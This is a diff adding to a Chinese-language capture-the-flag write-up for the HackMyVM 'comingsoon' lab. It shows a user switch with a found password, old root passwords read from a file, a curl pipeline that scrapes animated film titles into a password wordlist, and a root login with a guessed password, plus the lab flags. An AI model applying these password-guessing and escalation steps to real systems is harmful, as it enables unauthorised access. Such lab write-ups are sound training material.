@@ -155,5 +155,42 @@ tigger           (scpuser)
 ```
 切换用户
 ```c
+www-data@comingsoon:/home$ su scpuser //tigger
+
+scpuser@comingsoon:~$ cat user.txt
+cat user.txt
+HMV{user:comingsoon.hmv:58842fc1a7}
+
+```
+查看老密码
+```c
+scpuser@comingsoon:~$ cat .oldpasswords
+cat .oldpasswords
+Previous root passwords just incase they are needed for a backup\restore
+
+Incredibles2
+Paddington2
+BigHero6
+101Dalmations
+
+```
+参考这个链接才知道老密码的用处,原来密码是带有数字的动画电影名字：
+
+https://28right.blogspot.com/2021/12/hackmyvm-comingsoon.html
+生成单词列表
+```css
+curl https://www.rottentomatoes.com/top/bestofrt/top_100_animation_movies/|grep ")</a>"|sed 's/[(].*$//'|tr -d ' '> wordlist
+```
+
+应该上面的链接已经失效了，也知道思路了。这里就直接拿别人的密码登录了。
+
+```
+root:ToyStory3
+```
+
+```c
+root@comingsoon:~# cat root.txt
+cat root.txt
+HMV{root:comingsoon.hmv:2339dc81ca}
 
 ```
